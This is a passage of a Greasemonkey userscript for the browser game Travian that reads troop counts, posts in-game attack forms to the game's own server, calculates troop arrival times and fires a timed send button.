		XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
		null);
		//End Hill edition
	if (tag.snapshotLength)
	{
		temp = tag.snapshotItem(0).href.split("?")[1].split('&');
		return temp[0];
	}
}

function addCount(msg, br)
{
	countDiv = document.getElementById('count');
	countDiv.innerHTML = countDiv.innerHTML + (countDiv.innerHTML && br ? '<br>' : '')+msg;
}

function getCords()
{
	var tempX = document.getElementsByName('x');
	var tempY = document.getElementsByName('y');
	if (tempX.length)
	{
		if (tempX[0].value.length && tempY[0].value.length)
		{
			return tempX[0].value + cordsSplit + tempY[0].value;
		}else{
			return '';
		}
	}
	return 'undefined';
}

function addInfoDiv()
{
	var infoDiv = document.createElement("div");
	infoDiv.innerHTML = "<div><div id=\"err\"></div><br><br><div id=\"count\"></div></div>"
	thisDiv = document.getElementById('lright1');
	if(!thisDiv){
		var tempDiv = document.createElement('div');
		
		var midDiv = document.getElementById('lmidlc');
		
		if(!midDiv)
		{
			midDiv = document.getElementById('mid');
			tempDiv.setAttribute('id','mid');
		}
			else
			tempDiv.setAttribute('id','lright1');
		thisDiv = midDiv.parentNode.appendChild(tempDiv);
	}

	thisDiv.appendChild(infoDiv);
}
function abort()
{
	setTimeout(function(){realAbort()},100);
}

function realAbort ()
{
	cordN = 1;
	firstRun = true;
	wavesSent = 0;
	nThisWave = 0;
	numberattacks = 0;
	totalattacks = 0;
	myimbabutton.innerHTML = text[20]
}

function getCheckTroops()
{
	for (var num = 0;num<=11;num++)
	{
		if (num <=10)
		{
			troops[num] = new Array;
			if (!num)
			{
				troop = document.getElementsByName('number');
			}else {
				troop = document.getElementsByName('troop_' + num);
			}
			totTroops[num] = 0;
			for (var x = 0; x < troop.length;x++)
			{

				totTroops[num] = parseInt(totTroops[num]) + (parseInt(troop[x].value)) * (parseInt(troops[0][x]));
				troops[num][x] = troop[x].value
			}
		}else{
			troops[num] = new Array;
			troops[num+1] = new Array;
			for (var x = 0;x< troop.length; x++)
			{
				troops[11][x] = document.getElementById('gm_kata_' +(x+1) ).value;
				troops[12][x] = document.getElementById('gm_kata2_' +(x+1) ).value;
			}
		}
	}

	check = false;
	for(var x=1;x<=10;x++) //Sjekker om man har nok tropper
	{
		tempX = x;
		if (x==10){tempX++;}
		if (totTroops[x] > getTotalUnit('t'+tempX) ) {errorMsg(text[3] + x+ ")"); abort(); return;}
		if (totTroops[x] > 0) {check = true;}
	}
	if (!check)
	{
		errorMsg(text[4]);
		abort();
		return;
	}
}



//Skal implementeres asap
function getArrivalTime(tempWaveNumber, Xcord, Ycord)
{
	tempWaveNumber = 0;
	getCheckTroops();

	cords = document.getElementById('cords').value;
	cord = cords.split(targetSplit);

	var tempTargetCord = splitN(cord[0], cordsSplit);
	var Xcord = tempTargetCord[0];
	var Ycord = tempTargetCord[1];

	var tempUrl = document.location.href.split('?')[0] + '?' +DID;
	var tempPostvar = 'b=1&t1=' + troops[1][tempWaveNumber] + '&t4=' + troops[4][tempWaveNumber] + '&t7='+ troops[7][tempWaveNumber]         +'&t9='+ troops[9][tempWaveNumber] +'&t2='+ troops[2][tempWaveNumber] +'&t5='+ troops[5][tempWaveNumber] +'&t8='+ troops[8]       [tempWaveNumber] +'&t10='+ troops[11][tempWaveNumber] +'&t3='+ troops[3][tempWaveNumber] +'&t6='+ troops[6][tempWaveNumber] +'&c='+         3 +'&dname=&x='+Xcord+'&y='+Ycord+'&s1=ok';

	GM_xmlhttpRequest({ 
		method: "POST",
		url: tempUrl,
		headers:{'Content-type':'application/x-www-form-urlencoded'},
		data:encodeURI(tempPostvar),
		onload: function(responseDetails)
		{
			pulled = document.createElement('div');
			pulled.innerHTML = responseDetails.responseText;
			
			var pulleddoc = document.implementation.createDocument("", "", null);
			pulleddoc.appendChild(pulled);
			
			var ex = "//form//table[@class='tbg']//td[@width='50%']";

			tag = pulleddoc.evaluate(
				ex,
				pulled,
				null,
				XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
				null);
			if (!tag.snapshotLength)
			{
				ex = "//table[@class='std troop_details']//tbody//tr//td[@colspan='10']//tr//td";
				tag = pulleddoc.evaluate(
				ex,
				pulled,
				null,
				XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
				null);
			}
		
                        // begining of gotler's arrival time fix...
			// add following lines:
                        if (!tag.snapshotLength)
			{
				ex = ".//div[@class='in']";
				tag = pulleddoc.evaluate(
				ex,
				pulled,
				null,
				XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
				null);
			}
                        // end of gotler's arrival time fix...
		
		
			if (!tag.snapshotLength)
			{
				ex = ".//span[@id='tp2']";
				tag = pulleddoc.evaluate(
				ex,
				pulled,
				null,
				XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
				null);
			}
			if (tag.snapshotLength)
			{
				var sTim = tag.snapshotItem(0).textContent;
				var aTim = sTim.match(/([0-9]{1,2}):([0-9]{2}):([0-9]{2})/i);

				referenceSeconds = parseInt(aTim[1],10)*60*60+parseInt(aTim[2],10)*60+parseInt(aTim[3],10);

				document.getElementById('arrivalTimeDiv').innerHTML = text[21] +':' + tag.snapshotItem(0).innerHTML;

				clearInterval(timerIntervalId);
                timerIntervalId = setInterval(function(){arrivalCounter();sysTime()},100);
                arrivalCounter();
                sysTime();

			}else{
				alert(text[26]);
			}
		}
	});
}

function arrivalCounter()
{

		var sTime = document.evaluate(
				"id('tp1')",
				document,
				null,
				XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
				null);

		sTime = sTime.snapshotItem(0).textContent;
		var aMatch = sTime.match(/^([0-9]{1,2}):([0-9]{2}):([0-9]{2})$/i);

		var hours = minutes = seconds = 0;

		var sDate = new Date();
		var ad = 1;

	sDate.setHours((parseInt(aMatch[1]) + ((sDate.getSeconds >= (60-ad) && sDate.getMinutes >= 59) ? 1 : 0)) % 24);

		sDate.setMinutes((parseInt(aMatch[2]) + ((sDate.getSeconds >= (60-ad)) ? 1 : 0)) % 60);

		sDate.setSeconds((parseInt(aMatch[3]) ) % 60);

		sDate.setMilliseconds(0);



		var aDate = new Date(sDate.getTime()+ referenceSeconds*1000 -4);

		var aad=0;
		
		seconds = (aDate.getSeconds()+1)%60;
		if(aDate.getSeconds()+1==60)
		aad=1;

		minutes = aDate.getMinutes()+aad;

		hours = aDate.getHours();


		seconds = seconds.toString();
		minutes = minutes.toString();
		hours = hours.toString();
		seconds = seconds.replace(/\b(\d)\b/g, '0$1');
		minutes = minutes.replace(/\b(\d)\b/g, '0$1');
		hours = hours.replace(/\b(\d)\b/g, '0$1');

		if (timedAttacktimer)
		{
			tTimer = timedAttacktimer.split(':');
			if (tTimer.length == 3) {
				tSeconds = tTimer[2]
				tMinutes = tTimer[1]
				tHours = tTimer[0]


				if (tHours == hours && tMinutes == minutes && tSeconds == seconds)
				{
					myimbabutton.click();
					timedAttacktimer = false;
				} else if (tHours == hours && tMinutes == minutes && (tSeconds+6) >= seconds) {
					switchActiveVillage(DID);
				}
			}
		}
		document.getElementById('arrivalTimeDiv').innerHTML = text[21] +':' + hours + ":" + minutes + ":" + seconds;
}


function switchActiveVillage(did) {
	if(!did) { return; }
	GM_xmlhttpRequest({
		method: "GET",
		url: 'http://' + document.domain + "/dorf1.php?"+did,
		headers:{'Content-type':'application/x-www-form-urlencoded'}
	});
	return;
}

function setArrivalTimer() {
	getArrivalTime();
	timedAttacktimer = document.getElementById('timedArrivalInput').value;

	if (referenceSeconds) {
		var aMatch = timedAttacktimer.match(/^([0-9]{1,2}):([0-9]{2}):([0-9]{2})$/i);

		var hours = minutes = seconds = 0;

		var sDate = new Date();
		var ad = 0;

		sDate.setHours((parseInt(aMatch[1]) + ((sDate.getSeconds >= (60-ad) && sDate.getMinutes >= 59) ? 1 : 0)) % 24);
		sDate.setMinutes((parseInt(aMatch[2]) + ((sDate.getSeconds >= (60-ad)) ? 1 : 0)) % 60);
		sDate.setSeconds((parseInt(aMatch[3]) + ad) % 60);

		var aDate = new Date(sDate.getTime() - referenceSeconds*1000);

		if(aDate.getSeconds()==0)
		minutes = aDate.getMinutes();
		hours = aDate.getHours();

		addCount(text[28] + timedAttacktimer + '( ' + referenceSeconds + 's -> ' + hours + ':' + minutes + ':' + seconds + ')', 1);
	} else {
		addCount(text[28] + timedAttacktimer, 1);
	}
}

function detectLanguage() {
	if(sLang != "") {return;}
	var re = null; re = new RegExp("^http://[^/]*\.([a-zA-Z]{2,3})\/.*$", "i");
	var lang = window.location.href.match(re);
	if(!lang) {
		return;
	} else {
		sLang = lang.pop();
	}



//REVISED BY EmerR46
}